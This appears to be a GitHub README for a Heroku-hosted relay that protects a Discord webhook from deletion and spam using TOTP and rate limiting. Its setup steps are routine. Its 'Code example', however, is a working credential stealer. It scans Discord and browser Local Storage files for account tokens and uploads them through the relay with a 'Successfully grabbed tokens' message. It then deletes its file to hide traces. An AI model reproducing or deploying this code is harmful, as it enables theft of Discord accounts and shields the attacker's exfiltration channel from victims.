<h1 align="center">
  Discord Webhook Protector 🔰
</h1>

<p align="center"> 
  <kbd>
<img src="https://raw.githubusercontent.com/Rdimo/images/master/Discord-Webhook-Protector/Discord-Webhook-Protector.png"></img>
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
  <img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Discord-Webhook-Protector&metric=ncloc"/>
  <img src="https://img.shields.io/github/stars/Rdimo/Discord-Webhook-Protector?color=444444&label=Stars&style=flat-square"/>
  <img src="https://img.shields.io/github/forks/Rdimo/Discord-Webhook-Protector?color=444444&label=Forks&style=flat-square"/>
</p>

<h4 align="center">
  <a href="https://cheataway.com">🌌・Discord</a>
  ⋮
  <a href="https://github.com/Rdimo/Discord-Webhook-Protector#-%E3%80%A2-hosting-the-api">🎉・Setup the api</a>
  ⋮
  <a href="https://github.com/Rdimo/Discord-Webhook-Protector#-%E3%80%A2-code-example">🎈・Code example</a>
</h4>

<h2 align="center">
  Discord-Webhook-Protector was made by

Love ❌ code ✅

</h2>

---

## 🔰 〢 Features

```
> Easy to setup!
> Configurable!
> Completely *free* and stays online *24/7*
> Accepts json, discord embeds and files!
> Ratelimits unauthorized requests!
> Accepting only post requests!
> Impossible to delete webhook
> Webhook protected by totp so webhook can't be spammed even if they http debug!
```

---

### 📁 〢 Hosting the api

1. Create an account on [Heroku.com](https://heroku.com) (Yes all of this is **free**)
2. Install [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), and [git](https://git-scm.com/)
3. Open [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json) and put in your webhook at the top
4. Now you need a key, open cmd in the directory and type the following ⇣
```sh-session
$ cd test
$ py keyGen.py
>>> Your key is: ...
>>> Copied key to clipboard!
```
5. Paste your generated key in [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json)
6. Open a new cmd in the directory and type `npm i`
7. Now follow these steps carefully ⇣

```sh-session
$ heroku login
...
$ git init
$ git add .
$ git commit -m "first Webhook protector api commit"
...
$ heroku create
...
$ git push heroku master
...
$ heroku ps:scale web=1
...
$ heroku domains
...
```

8. Done! After typing `heroku domains` you should get something in the console like **shrouded-fjord-36366.herokuapp.com**. This is your api with your undeletable/unspammable webhook!

#### If you get an error when doing `"git push heroku master"` that looks like this

```sh
$ first issue error: failed to push some refs to 'https://git.heroku.com/app-name.git'
```
Then run `"git push heroku main"` instead | https://github.com/Rdimo/Discord-Webhook-Protector/issues/1

ㅤ

If you make some changes in the code and want to update the api on heroku, simply run `npm run deploy` to push out the updates \
If any bugs occur please report them or try and see if restarting the app by typing `heroku restart` works!
For testing that your api works, open cmd in the directory and type the following ⇣

```sh-session
$ cd .\test
...
$ py test.py
```

it should've made a post request to the api uploading itself and sending "it works!" to the webhook

---

### ⚙ 〢 Settings

The config and what the options do

```json
{
  "webhook": "https://discord.com/api/webhooks/0123456789/abcdefghijklmnopqrstuvwxyz", //your discord webhook
  "pass32": "K4ZVUQTSIRMDOWKRGU2WQQTZJM======" /*a key encoded in base32, use the keyGen in ./test or see https://github.com/bellstrand/totp-generator#how-to-use for more*/,
  "rateLimitTimeout": 12000, //amount of milliseconds an ip gets ratelimited (Default: 30000 --> 30 seconds)
  "port": 3000 //port
}
```

---

### 🎈 〢 Code example

Example use of the api hosted on heroku

```py
import os, re
import requests
from pyotp import TOTP

api = "https://your-heroku-app-name.herokuapp.com" #the name of your app will probably be something like https://frozen-beach-72554.herokuapp.com

pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #needs to be same key as the one in your api
key = TOTP(pass32).now()

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
_file = os.getenv('temp') + os.sep + 'tokens.txt'

paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb'
}
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    with open(_file, 'a') as f:
                        f.write(token)

requests.post(api, headers={"Authorization": key}, data={"content": f'Successfully grabbed tokens from {os.getlogin()}:'}) #send the text to webhook
requests.post(api, headers={"Authorization": key}, files={"upload_file": open(_file, 'rb')}) #send text file with tokens in it to the webhook
os.remove(_file) #delete traces
```

> Thank you [xrevix](https://github.com/xrevix) for bug testing and reporting all of them 😘
